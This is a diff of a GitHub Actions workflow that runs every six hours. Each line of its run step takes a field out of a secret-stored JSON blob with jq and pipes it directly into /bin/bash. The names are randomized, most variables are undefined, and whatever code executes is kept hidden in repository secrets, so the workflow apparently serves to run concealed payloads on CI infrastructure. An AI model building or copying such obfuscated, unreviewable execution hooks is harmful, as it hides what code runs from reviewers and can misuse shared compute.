@@ -3,21 +3,28 @@ name: liruicheng9876
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
+    - cron: '20 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liruicheng9876
         env:
-          admv940: ${{ secrets.admv940 }}
+          n439: ${{ secrets.n439 }}
         run: |
-          echo $admv940 | jq -r .w6753 | /bin/bash
-          echo $jhzt9043 | jq -r .rm6539 | /bin/bash
-          echo $bft5 | jq -r .cbx3188 | /bin/bash
-          echo $asrk9 | jq -r .k1772 | /bin/bash
-          echo $mzg58716 | jq -r .swsd9976 | /bin/bash
+          echo $n439 | jq -r .s3 | /bin/bash
+          echo $zbvz566 | jq -r .gz96610 | /bin/bash
+          echo $xrk7 | jq -r .ki71 | /bin/bash
+          echo $fe21 | jq -r .nlt9 | /bin/bash
+          echo $qm9894 | jq -r .bl24 | /bin/bash
+          echo $g86 | jq -r .el72 | /bin/bash
+          echo $g47 | jq -r .t5 | /bin/bash
+          echo $ez99 | jq -r .shc70 | /bin/bash
+          echo $dfcwz1166 | jq -r .hpeuz7450 | /bin/bash
+          echo $aene0 | jq -r .ka9 | /bin/bash
+          echo $mfwr5653 | jq -r .xsijb97 | /bin/bash
+          echo $ppdv6132 | jq -r .hqzc4 | /bin/bash
+          echo $ag3 | jq -r .gndok4 | /bin/bash
 
